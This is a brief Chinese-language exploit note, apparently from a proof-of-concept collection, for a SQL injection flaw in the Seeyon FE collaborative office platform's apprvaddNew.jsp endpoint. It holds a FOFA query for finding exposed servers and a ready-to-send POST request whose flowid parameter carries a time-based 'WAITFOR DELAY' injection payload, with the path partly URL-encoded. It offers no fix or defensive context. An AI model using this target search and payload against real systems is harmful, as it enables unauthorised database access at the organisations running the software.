# 致远互联FE协作办公平台apprvaddNew存在sql注入漏洞

## fofa

```java
title="FE协作办公平台" || body="li_plugins_download"
```

## poc

```java
POST /witapprovemanage/apprvaddNew.j%73p HTTP/1.1
Host:
User-Agent:Mozilla/5.0 (WindowsNT10.0;Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko)Chrome/96.0.4664.93Safari/537.36
Content-Type:application/x-www-form-urlencoded

flowid=1';WAITFOR+DELAY+'0:0:5'--+---
```

![image-20240801195718315](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408011957376.png)